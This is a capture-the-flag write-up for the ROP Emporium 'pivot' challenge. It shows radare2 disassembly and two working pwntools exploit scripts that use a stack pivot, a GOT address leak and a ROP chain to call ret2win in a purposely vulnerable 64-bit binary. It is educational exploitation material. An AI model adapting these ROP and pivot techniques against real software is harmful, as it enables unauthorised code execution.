# pivot

Downloading, unzipping, and running the [challenge file](https://ropemporium.com/binary/pivot.zip):

```sh
$ ./pivot
pivot by ROP Emporium
64bits

Call ret2win() from libpivot.so
The Old Gods kindly bestow upon you a place to pivot: 0x7f7b798dbf10
Send your second chain now and it will land there
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Now kindly send your stack smash
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[1]    948 segmentation fault (core dumped)  ./pivot
```

Yay so this one is different!

The challenge alludes to a "pivot" and a "second chain", but let's start by taking a look at the `pwnme` function and why we might need any of that at all:

```asm
$ r2 -A pivot
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[x] Type matching analysis for all functions (afta)
[x] Use -AA or aaaa to perform additional experimental analysis.

[0x004008a0]> pd @ sym.pwnme
/ (fcn) sym.pwnme 167
|   sym.pwnme (char *arg1);
|           ; var char *local_28h @ rbp-0x28
|           ; var char *s @ rbp-0x20
|           ; arg char *arg1 @ rdi
|           ; CALL XREF from sym.main (0x400a11)
|           0x00400a3b      55             push rbp
|           0x00400a3c      4889e5         mov rbp, rsp
|           0x00400a3f      4883ec30       sub rsp, 0x30               ; '0'
|           0x00400a43      48897dd8       mov qword [local_28h], rdi  ; arg1
|           0x00400a47      488d45e0       lea rax, [s]
|           0x00400a4b      ba20000000     mov edx, 0x20               ; 32 ; size_t n
|           0x00400a50      be00000000     mov esi, 0                  ; int c
|           0x00400a55      4889c7         mov rdi, rax                ; void *s
|           0x00400a58      e8c3fdffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)
|           0x00400a5d      bfc00b4000     mov edi, str.Call_ret2win___from_libpivot.so ; 0x400bc0 ; "Call ret2win() from libpivot.so" ; const char *s
|           0x00400a62      e899fdffff     call sym.imp.puts           ; int puts(const char *s)
|           0x00400a67      488b45d8       mov rax, qword [local_28h]
|           0x00400a6b      4889c6         mov rsi, rax
|           0x00400a6e      bfe00b4000     mov edi, str.The_Old_Gods_kindly_bestow_upon_you_a_place_to_pivot:__p ; 0x400be0 ; "The Old Gods kindly bestow upon you a place to pivot: %p\n" ; const char *format
|           0x00400a73      b800000000     mov eax, 0
|           0x00400a78      e893fdffff     call sym.imp.printf         ; int printf(const char *format)
|           0x00400a7d      bf200c4000     mov edi, str.Send_your_second_chain_now_and_it_will_land_there ; 0x400c20 ; "Send your second chain now and it will land there" ; const char *s
|           0x00400a82      e879fdffff     call sym.imp.puts           ; int puts(const char *s)
|           0x00400a87      bf520c4000     mov edi, 0x400c52           ; const char *format
|           0x00400a8c      b800000000     mov eax, 0
|           0x00400a91      e87afdffff     call sym.imp.printf         ; int printf(const char *format)
|           0x00400a96      488b15f31520.  mov rdx, qword [obj.stdin__GLIBC_2.2.5] ; [0x602090:8]=0 ; FILE *stream
|           0x00400a9d      488b45d8       mov rax, qword [local_28h]
|           0x00400aa1      be00010000     mov esi, 0x100              ; 256 ; int size
|           0x00400aa6      4889c7         mov rdi, rax                ; char *s
|           0x00400aa9      e892fdffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
|           0x00400aae      bf580c4000     mov edi, str.Now_kindly_send_your_stack_smash ; 0x400c58 ; "Now kindly send your stack smash" ; const char *s
|           0x00400ab3      e848fdffff     call sym.imp.puts           ; int puts(const char *s)
|           0x00400ab8      bf520c4000     mov edi, 0x400c52           ; const char *format
|           0x00400abd      b800000000     mov eax, 0
|           0x00400ac2      e849fdffff     call sym.imp.printf         ; int printf(const char *format)
|           0x00400ac7      488b15c21520.  mov rdx, qword [obj.stdin__GLIBC_2.2.5] ; [0x602090:8]=0 ; FILE *stream
|           0x00400ace      488d45e0       lea rax, [s]
|           0x00400ad2      be40000000     mov esi, 0x40               ; '@' ; 64 ; int size
|           0x00400ad7      4889c7         mov rdi, rax                ; char *s
|           0x00400ada      e861fdffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
|           0x00400adf      90             nop
|           0x00400ae0      c9             leave
\           0x00400ae1      c3             ret
/ (fcn) sym.uselessFunction 24
|   sym.uselessFunction ();
|           0x00400ae2      55             push rbp
|           0x00400ae3      4889e5         mov rbp, rsp
|           0x00400ae6      b800000000     mov eax, 0
|           0x00400aeb      e860fdffff     call sym.imp.foothold_function
|           0x00400af0      bf01000000     mov edi, 1                  ; int status
\           0x00400af5      e886fdffff     call sym.imp.exit           ; void exit(int status)
            0x00400afa      660f1f440000   nop word [rax + rax]
            ;-- usefulGadgets:
            0x00400b00      58             pop rax
            0x00400b01      c3             ret
            0x00400b02      4894           xchg rax, rsp
            0x00400b04      c3             ret
            0x00400b05      488b00         mov rax, qword [rax]
            0x00400b08      c3             ret
            0x00400b09      4801e8         add rax, rbp                ; '$'
            0x00400b0c      c3             ret
            0x00400b0d      0f1f00         nop dword [rax]
```

There's really quite a lot more going on here than previous challenges, but the easiest thing to do is by starting at the inputs to the binary.

The "stack smash" limits our input to 64 (`0x40`) bytes:
```asm
|           0x00400ac7      488b15c21520.  mov rdx, qword [obj.stdin__GLIBC_2.2.5] ; [0x602090:8]=0 ; FILE *stream
|           0x00400ace      488d45e0       lea rax, [s]
|           0x00400ad2      be40000000     mov esi, 0x40               ; '@' ; 64 ; int size
|           0x00400ad7      4889c7         mov rdi, rax                ; char *s
|           0x00400ada      e861fdffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
```

And the stack buffer was previously allocated 32 (`0x20`) bytes:
```asm
|           0x00400a4b      ba20000000     mov edx, 0x20               ; 32 ; size_t n
|           0x00400a50      be00000000     mov esi, 0                  ; int c
|           0x00400a55      4889c7         mov rdi, rax                ; void *s
|           0x00400a58      e8c3fdffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)
```

So we're left with just 32 bytes of overflow 😮 If we recall that the saved base pointer lies at the top of stack frame, that leaves us with 24 bytes for ROP games.

This is a 64bit architecture, so each instruction address will be 8 bytes. Essentially we have just enough room for one or maybe two ROP gadgets and perhaps an argument or two.

Luckily, we're able to write much larger payloads somewhere else:
```asm
|           0x00400a96      488b15f31520.  mov rdx, qword [obj.stdin__GLIBC_2.2.5] ; [0x602090:8]=0 ; FILE *stream
|           0x00400a9d      488b45d8       mov rax, qword [local_28h]
|           0x00400aa1      be00010000     mov esi, 0x100              ; 256 ; int size
|           0x00400aa6      4889c7         mov rdi, rax                ; char *s
|           0x00400aa9      e892fdffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
```

So it looks like we can write 256 (`0x100`) bytes to the location pointed to by the variable `local_28h`.

Backtracking to the top of the function, we can see that `local_28h` is actually an argument to the function:

```asm
/ (fcn) sym.pwnme 167
|   sym.pwnme (char *arg1);
|           ; var char *local_28h @ rbp-0x28
|           ; var char *s @ rbp-0x20
|           ; arg char *arg1 @ rdi
|           ; CALL XREF from sym.main (0x400a11)
|           0x00400a3b      55             push rbp
|           0x00400a3c      4889e5         mov rbp, rsp
|           0x00400a3f      4883ec30       sub rsp, 0x30               ; '0'
|           0x00400a43      48897dd8       mov qword [local_28h], rdi  ; arg1
```

And looking at where `sym.pwnme` is called, we can see where that argument comes from:
```asm
[0x004008a0]> pdf @ main
            ;-- main:
/ (fcn) sym.main 165
|   sym.main (int argc, char **argv, char **envp);
|           ; var int local_10h @ rbp-0x10
|           ; var void *ptr @ rbp-0x8
|           ; DATA XREF from entry0 (0x4008bd)
|           0x00400996      55             push rbp
|           0x00400997      4889e5         mov rbp, rsp
|           0x0040099a      4883ec10       sub rsp, 0x10
|           0x0040099e      488b05db1620.  mov rax, qword [obj.stdout__GLIBC_2.2.5] ; [0x602080:8]=0
|           0x004009a5      b900000000     mov ecx, 0                  ; size_t size
|           0x004009aa      ba02000000     mov edx, 2                  ; int mode
|           0x004009af      be00000000     mov esi, 0                  ; char *buf
|           0x004009b4      4889c7         mov rdi, rax                ; FILE*stream
|           0x004009b7      e8b4feffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
|           0x004009bc      488b05dd1620.  mov rax, qword [obj.stderr__GLIBC_2.2.5] ; [0x6020a0:8]=0
|           0x004009c3      b900000000     mov ecx, 0                  ; size_t size
|           0x004009c8      ba02000000     mov edx, 2                  ; int mode
|           0x004009cd      be00000000     mov esi, 0                  ; char *buf
|           0x004009d2      4889c7         mov rdi, rax                ; FILE*stream
|           0x004009d5      e896feffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
|           0x004009da      bf980b4000     mov edi, str.pivot_by_ROP_Emporium ; 0x400b98 ; "pivot by ROP Emporium" ; const char *s
|           0x004009df      e81cfeffff     call sym.imp.puts           ; int puts(const char *s)
|           0x004009e4      bfae0b4000     mov edi, str.64bits         ; 0x400bae ; "64bits\n" ; const char *s
|           0x004009e9      e812feffff     call sym.imp.puts           ; int puts(const char *s)
|           0x004009ee      bf00000001     mov edi, 0x1000000          ; size_t size
|           0x004009f3      e868feffff     call sym.imp.malloc         ; void *malloc(size_t size)
|           0x004009f8      488945f8       mov qword [ptr], rax
|           0x004009fc      488b45f8       mov rax, qword [ptr]
|           0x00400a00      480500ffff00   add rax, 0xffff00
|           0x00400a06      488945f0       mov qword [local_10h], rax
|           0x00400a0a      488b45f0       mov rax, qword [local_10h]
|           0x00400a0e      4889c7         mov rdi, rax
|           0x00400a11      e825000000     call sym.pwnme
|           0x00400a16      48c745f00000.  mov qword [local_10h], 0
|           0x00400a1e      488b45f8       mov rax, qword [ptr]
|           0x00400a22      4889c7         mov rdi, rax                ; void *ptr
|           0x00400a25      e8c6fdffff     call sym.imp.free           ; void free(void *ptr)
|           0x00400a2a      bfb60b4000     mov edi, str.Exiting        ; 0x400bb6 ; "\nExiting" ; const char *s
|           0x00400a2f      e8ccfdffff     call sym.imp.puts           ; int puts(const char *s)
|           0x00400a34      b800000000     mov eax, 0
|           0x00400a39      c9             leave
\           0x00400a3a      c3             ret
```

The relevant lines are:
```asm
|           0x004009f3      e868feffff     call sym.imp.malloc         ; void *malloc(size_t size)
|           0x004009f8      488945f8       mov qword [ptr], rax
|           0x004009fc      488b45f8       mov rax, qword [ptr]
|           0x00400a00      480500ffff00   add rax, 0xffff00
|           0x00400a06      488945f0       mov qword [local_10h], rax
|           0x00400a0a      488b45f0       mov rax, qword [local_10h]
|           0x00400a0e      4889c7         mov rdi, rax
|           0x00400a11      e825000000     call sym.pwnme
```

which shows us that `malloc` is the source of the value. Our input will end up in a heap address given to us by the `malloc` call.

Thankfully, we're even given the heap address when the binary runs:

```sh
$ ./pivot
pivot by ROP Emporium
64bits

Call ret2win() from libpivot.so
The Old Gods kindly bestow upon you a place to pivot: 0x7f7b798dbf10
```

Running the binary several times in a row demonstrates that the address changes from run to run.

This is expected behavior from `malloc`, but means that we'll have to dynamically parse the address - no statically coding it in our exploit.

This is where the "pivot" name of the challenge comes from. In order to gain more room for our ROP shenanigans, we'll leverage our ability to write larger payloads to a different location and then a gadget which can change the stack pointer:

```asm
[0x004008a0]> /R rsp

  [A BUNCH OF LINES WE DON'T CARE ABOUT RIGHT NOW]

  0x00400afe               0000  add byte [rax], al
  0x00400b00                 58  pop rax
  0x00400b01                 c3  ret
  0x00400b02               4894  xchg rax, rsp
  0x00400b04                 c3  ret

  [A BUNCH MORE LINES]
```

Oh hey so that's good news. `0x00400b00` will let us pop a value into `rax` and `0x00400b02` will let us put that value into `rsp`.

We can arrange our stack smash like this and have exactly the 24 bytes we're limited to:
```
0x00400b00
[OUR HEAP ADDRESS]
0x00400b02
```

When the `xchg rax, rsp; ret;` gadget executes, the `ret` instruction will pop the next value off the stack.
Because we've changed the stack pointer's address, the next value popped will actually be whatever we put at that new address, and we can continue our ROP chain.
In this case, we want to 'pivot' to the heap, because that's where we are able to write our first payload.

Ok, so far so good, but what about that line `Call ret2win() from libpivot.so`?

The challenge has a little bit of helpful hint text:
> The ret2win() function in the libpivot.so shared object isn't imported, but that doesn't mean you can't call it using ROP! You'll need to find the .got.plt entry of foothold_function() and add the offset of ret2win() to it to resolve its actual address. Notice that foothold_function() isn't called during normal program flow, you'll have to call it first to populate the .got.plt entry.

Looking at the `pivot` binary, we can see that `ret2win` isn't in the `pivot` binary's PLT:
```asm
[0x004008a0]> iS
[Sections]
Nm Paddr       Size Vaddr      Memsz Perms Name
00 0x00000000     0 0x00000000     0 ---- 
01 0x00000238    28 0x00400238    28 -r-- .interp
02 0x00000254    32 0x00400254    32 -r-- .note.ABI_tag
03 0x00000274    36 0x00400274    36 -r-- .note.gnu.build_id
04 0x00000298    68 0x00400298    68 -r-- .gnu.hash
05 0x000002e0   552 0x004002e0   552 -r-- .dynsym
06 0x00000508   269 0x00400508   269 -r-- .dynstr
07 0x00000616    46 0x00400616    46 -r-- .gnu.version
08 0x00000648    32 0x00400648    32 -r-- .gnu.version_r
09 0x00000668    96 0x00400668    96 -r-- .rela.dyn
10 0x000006c8   240 0x004006c8   240 -r-- .rela.plt
11 0x000007b8    26 0x004007b8    26 -r-x .init
12 0x000007e0   176 0x004007e0   176 -r-x .plt
13 0x00000890     8 0x00400890     8 -r-x .plt.got
14 0x000008a0   738 0x004008a0   738 -r-x .text
15 0x00000b84     9 0x00400b84     9 -r-x .fini
16 0x00000b90   233 0x00400b90   233 -r-- .rodata
17 0x00000c7c    68 0x00400c7c    68 -r-- .eh_frame_hdr
18 0x00000cc0   308 0x00400cc0   308 -r-- .eh_frame
19 0x00001df0     8 0x00601df0     8 -rw- .init_array
20 0x00001df8     8 0x00601df8     8 -rw- .fini_array
21 0x00001e00     8 0x00601e00     8 -rw- .jcr
22 0x00001e08   496 0x00601e08   496 -rw- .dynamic
23 0x00001ff8     8 0x00601ff8     8 -rw- .got
24 0x00002000   104 0x00602000   104 -rw- .got.plt
25 0x00002068    16 0x00602068    16 -rw- .data
26 0x00002078     0 0x00602080    48 -rw- .bss
27 0x00002078    52 0x00000000    52 ---- .comment
28 0x00002b77   268 0x00000000   268 ---- .shstrtab
29 0x000020b0  1968 0x00000000  1968 ---- .symtab
30 0x00002860   791 0x00000000   791 ---- .strtab

[0x004008a0]> pd @ 0x004007e0
            ;-- section..plt:
            ; XREFS: CODE 0x004007fb  CODE 0x0040080b  CODE 0x0040081b  CODE 0x0040082b  CODE 0x0040083b  CODE 0x0040084b  
            ; XREFS: CODE 0x0040085b  CODE 0x0040086b  CODE 0x0040087b  CODE 0x0040088b  
  .......-> 0x004007e0      ff3522182000   push qword [0x00602008]     ; [12] -r-x section size 176 named .plt
  :::::::   0x004007e6      ff2524182000   jmp qword [0x00602010]      ; [0x602010:8]=0
  :::::::   0x004007ec      0f1f4000       nop dword [rax]
/ (fcn) sym.imp.free 6
|   sym.imp.free (void *ptr);
| :::::::   ; CALL XREF from sym.main (0x400a25)
\ :::::::   0x004007f0      ff2522182000   jmp qword reloc.free        ; [0x602018:8]=0x4007f6
  :::::::   0x004007f6      6800000000     push 0
  ========< 0x004007fb      e9e0ffffff     jmp 0x4007e0
/ (fcn) sym.imp.puts 6
|   sym.imp.puts (const char *s);
| :::::::   ; XREFS: CALL 0x004009df  CALL 0x004009e9  CALL 0x00400a2f  CALL 0x00400a62  CALL 0x00400a82  CALL 0x00400ab3  
\ :::::::   0x00400800      ff251a182000   jmp qword reloc.puts        ; [0x602020:8]=0x400806
  :::::::   0x00400806      6801000000     push 1                      ; 1
  ========< 0x0040080b      e9d0ffffff     jmp 0x4007e0
/ (fcn) sym.imp.printf 6
|   sym.imp.printf (const char *format);
| :::::::   ; CALL XREFS from sym.pwnme (0x400a78, 0x400a91, 0x400ac2)
\ :::::::   0x00400810      ff2512182000   jmp qword reloc.printf      ; [0x602028:8]=0x400816
  :::::::   0x00400816      6802000000     push 2                      ; 2
  ========< 0x0040081b      e9c0ffffff     jmp 0x4007e0
/ (fcn) sym.imp.memset 6
|   sym.imp.memset (void *s, int c, size_t n);
| :::::::   ; CALL XREF from sym.pwnme (0x400a58)
\ :::::::   0x00400820      ff250a182000   jmp qword reloc.memset      ; [0x602030:8]=0x400826 ; "&\b@"
  :::::::   0x00400826      6803000000     push 3                      ; 3
  `=======< 0x0040082b      e9b0ffffff     jmp 0x4007e0
/ (fcn) sym.imp.__libc_start_main 6
|   sym.imp.__libc_start_main (func main, int argc, char **ubp_av, func init, func fini, func rtld_fini, void *stack_end);
|  ::::::   ; CALL XREF from entry0 (0x4008c4)
\  ::::::   0x00400830      ff2502182000   jmp qword reloc.__libc_start_main ; [0x602038:8]=0x400836 ; "6\b@"
   ::::::   0x00400836      6804000000     push 4                      ; 4
   `======< 0x0040083b      e9a0ffffff     jmp 0x4007e0
/ (fcn) sym.imp.fgets 6
|   sym.imp.fgets (char *s, int size, FILE *stream);
|   :::::   ; CALL XREFS from sym.pwnme (0x400aa9, 0x400ada)
\   :::::   0x00400840      ff25fa172000   jmp qword reloc.fgets       ; [0x602040:8]=0x400846 ; "F\b@"
    :::::   0x00400846      6805000000     push 5                      ; 5
    `=====< 0x0040084b      e990ffffff     jmp 0x4007e0
/ (fcn) sym.imp.foothold_function 6
|   sym.imp.foothold_function ();
|    ::::   ; CALL XREF from sym.uselessFunction (0x400aeb)
\    ::::   0x00400850      ff25f2172000   jmp qword reloc.foothold_function ; [0x602048:8]=0x400856 ; "V\b@"
     ::::   0x00400856      6806000000     push 6                      ; 6
     `====< 0x0040085b      e980ffffff     jmp 0x4007e0
/ (fcn) sym.imp.malloc 6
|   sym.imp.malloc (size_t size);
|     :::   ; CALL XREF from sym.main (0x4009f3)
\     :::   0x00400860      ff25ea172000   jmp qword reloc.malloc      ; [0x602050:8]=0x400866 ; "f\b@"
      :::   0x00400866      6807000000     push 7                      ; 7
      `===< 0x0040086b      e970ffffff     jmp 0x4007e0
/ (fcn) sym.imp.setvbuf 6
|   sym.imp.setvbuf (FILE*stream, char *buf, int mode, size_t size);
|      ::   ; CALL XREFS from sym.main (0x4009b7, 0x4009d5)
\      ::   0x00400870      ff25e2172000   jmp qword reloc.setvbuf     ; [0x602058:8]=0x400876 ; "v\b@"
       ::   0x00400876      6808000000     push 8                      ; 8
       `==< 0x0040087b      e960ffffff     jmp 0x4007e0
/ (fcn) sym.imp.exit 6
|   sym.imp.exit (int status);
|       :   ; CALL XREF from sym.uselessFunction (0x400af5)
\       :   0x00400880      ff25da172000   jmp qword reloc.exit        ; [0x602060:8]=0x400886
        :   0x00400886      6809000000     push 9                      ; 9
        `=< 0x0040088b      e950ffffff     jmp 0x4007e0
            ;-- section..plt.got:
```

We can't just jump to a `ret2win` PLT entry like we could for the [callme](../callme/README.md) challenge.

We're going to have to do a little detective work to figure out how to jump to the `ret2win` function.

If we remember from our previous experience with the PLT, a call to a dynamically loaded function will jump to the PLT.
The first call to that function will end up jumping into the dynamic loader and populating the GOT (global offset table) with the actual address of the library function.
Further calls to that function will refer directly to the GOT, which will then contain the actual address of the loaded function.

If we know the address where the library function is loaded and we know the offset between the loaded function and our target function, we can calculate the actual address of the target function.

So what we need to do is trick the binary into loading the the library function and then leak its address!

We can use the `foothold_function` and the `puts` entries in the PLT, along with the address of the `foothold_function` GOT entry:

```python
from pwn import *
import re

l = process("./pivot")

pop_rax = p64(0x00400b00) # pop rax; ret
pop_rdi = p64(0x00400b73) # pop rdi; ret

xchg_rax_rsp = p64(0x00400b02) # xchg rax, rsp; ret

mov_rax_rax = p64(0x00400b05) # mov rax, qword [rax]; ret

add_rax_rbp = p64(0x00400b09) # add rax, rbp; ret

foothold_function = p64(0x00400850) # The PLT address, because the address in the pwnme function contains a 0x0a (newline)

puts = p64(0x00400800)

foothold_got = p64(0x602048)

message1 = l.recvuntil("> ")
print message1
r = r'pivot: (.*)$'
heap_addr = p64(int(re.search(r, message1, re.MULTILINE).group(1), 16))

print "Found heap_addr: ", heap_addr

payload1 = foothold_function
payload1 += pop_rdi
payload1 += foothold_got
payload1 += puts

print "Sending payload1: ", payload1.encode("hex")
l.sendline(payload1)

print l.recvuntil("> ")

payload2 = "A" * 0x28
payload2 += pop_rax
payload2 += heap_addr
payload2 += xchg_rax_rsp

print "Sending payload2: ", payload2.encode("hex")
l.sendline(payload2)

print l.clean()
```

Running it gets us:
```sh
$ python exploit.py
[+] Starting local process './pivot': pid 11740
pivot by ROP Emporium
64bits

Call ret2win() from libpivot.so
The Old Gods kindly bestow upon you a place to pivot: 0x7fc8e6c89f10
Send your second chain now and it will land there
> 
Found heap_addr:  \x10\x9f���\x00\x00
Sending payload1:  5008400000000000730b40000000000048206000000000000008400000000000
Now kindly send your stack smash
> 
Sending payload2:  41414141414141414141414141414141414141414141414141414141414141414141414141414141000b400000000000109fc8e6c87f0000020b400000000000
foothold_function(), check out my .got.plt entry to gain a foothold into libpivot.sop\xb9\x06��

[*] Stopped process './pivot' (pid 11740)
```

Ok so it does look like we received some bytes at the very end which are our GOT address.

The next step is to figure out the offset between the `foothold_function` and the `ret2win` functions in the `libpivot.so` library:
```asm
$ r2 -A libpivot.so

[0x00000870]> pdf @ sym.foothold_function 
/ (fcn) sym.foothold_function 24
|   sym.foothold_function ();
|           0x00000970      55             push rbp
|           0x00000971      4889e5         mov rbp, rsp
|           0x00000974      488d3d6d0100.  lea rdi, str.foothold_function____check_out_my_.got.plt_entry_to_gain_a_foothold_into_libpivot.so ; section..rodata ; 0xae8 ; "foothold_function(), check out my .got.plt entry to gain a foothold into libpivot.so" ; const char *format
|           0x0000097b      b800000000     mov eax, 0
|           0x00000980      e8bbfeffff     call sym.imp.printf         ; int printf(const char *format)
|           0x00000985      90             nop
|           0x00000986      5d             pop rbp
\           0x00000987      c3             ret

[0x00000870]> pdf @ sym.ret2win
/ (fcn) sym.ret2win 26
|   sym.ret2win ();
|           0x00000abe      55             push rbp
|           0x00000abf      4889e5         mov rbp, rsp
|           0x00000ac2      488d3d880000.  lea rdi, str.bin_cat_flag.txt ; 0xb51 ; "/bin/cat flag.txt" ; const char *string
|           0x00000ac9      e862fdffff     call sym.imp.system         ; int system(const char *string)
|           0x00000ace      bf00000000     mov edi, 0                  ; int status
\           0x00000ad3      e878fdffff     call sym.imp.exit           ; void exit(int status)

[0x00000870]> ? sym.ret2win - sym.foothold_function
hex     0x14e
octal   0516
unit    334
segment 0000:014e
int32   334
string  "N\x01"
binary  0b0000000101001110
fvalue: 334.0
float:  0.000000f
double: 0.000000
trits   0t110101
```

Neat eh? So we know that `ret2win` is `0x14e` away from `foothold_function` and we can force the binary to leak us the `foothold_function` address from the GOT.
But now that we know the `ret2win` function's address, the binary crashes! We only get these two changes at input - we need to be able to have another shot at input to the executable after we've leaked the address!

This had me stumped for a while - how could we possibly leverage the `ret2win` address if we only received it after we had already sent our payload???

Luckily for me, my friend @cfinucane was around and very helpfully pointed out that I still had control of the last return pointer and that after my payload I could jump anywhere I want, including back to the top of `pwnme` in order to run through the `fgets` calls again 😹

Unfortunately, the `pwnme` function's address contains `0x0a` which corresponds to a newline, so we won't be able to pass that in through the `fgets` call.
Luckily we can just use the address of `main` because it calls `pwnme`.

So now that we've leaked the `ret2win` address, we just need to use it for the stack smash on the second go around:

```python
from pwn import *
import re

l = process("./pivot")

pop_rax = p64(0x00400b00) # pop rax; ret
pop_rdi = p64(0x00400b73) # pop rdi; ret

xchg_rax_rsp = p64(0x00400b02) # xchg rax, rsp; ret

mov_rax_rax = p64(0x00400b05) # mov rax, qword [rax]; ret

add_rax_rbp = p64(0x00400b09) # add rax, rbp; ret

foothold_function = p64(0x00400850) # The PLT address, because the address in the pwnme function contains a 0x0a (newline)

main = p64(0x00400996)
puts = p64(0x00400800)
foothold_got = p64(0x602048)

message1 = l.recvuntil("> ")
print "message1: "
print message1
r = r'pivot: (.*)$'
heap_addr = p64(int(re.search(r, message1, re.MULTILINE).group(1), 16))

print "Found heap_addr: ", heap_addr

payload1 = foothold_function
payload1 += pop_rdi
payload1 += foothold_got
payload1 += puts
payload1 += main
payload1 += "B"*8

print "Sending payload1: ", payload1.encode("hex")
l.sendline(payload1)

print l.recvuntil("> ")

payload2 = "A" * 0x28
payload2 += pop_rax
payload2 += heap_addr
payload2 += xchg_rax_rsp

print "Sending payload2: ", payload2.encode("hex")
l.send(payload2)

print l.recvuntil(".so")

foothold_ptr = u64(l.recv(6) + "\x00\x00")
print "foothold_ptr = ", hex(foothold_ptr)

ret2win_ptr = p64(foothold_ptr + 0x14e)

payload3 = "A" * 0x28
payload3 += ret2win_ptr

print "GET READY WE ARE GOING IN AGAIN"

print l.sendlineafter("> ", "C" * 8)

print l.sendlineafter("> ", payload3)

print l.clean()
```

Aaaand running it:

```sh
$ python exploit2.py
[+] Starting local process './pivot': pid 1235
message1: 
pivot by ROP Emporium
64bits

Call ret2win() from libpivot.so
The Old Gods kindly bestow upon you a place to pivot: 0x7f97e4353f10
Send your second chain now and it will land there
> 
Found heap_addr:  \x10?5��\x00\x00
Sending payload1:  5008400000000000730b4000000000004820600000000000000840000000000096094000000000004242424242424242
Now kindly send your stack smash
> 
Sending payload2:  41414141414141414141414141414141414141414141414141414141414141414141414141414141000b400000000000103f35e4977f0000020b400000000000
foothold_function(), check out my .got.plt entry to gain a foothold into libpivot.so
foothold_ptr =  0x7f97e4735970
GET READY WE ARE GOING IN AGAIN

pivot by ROP Emporium
64bits

Call ret2win() from libpivot.so
The Old Gods kindly bestow upon you a place to pivot: 0x7f97e3352f10
Send your second chain now and it will land there

Now kindly send your stack smash

ROPE{a_placeholder_32byte_flag!}

[*] Process './pivot' stopped with exit code 0 (pid 1235)
```

😀🎆😻😎
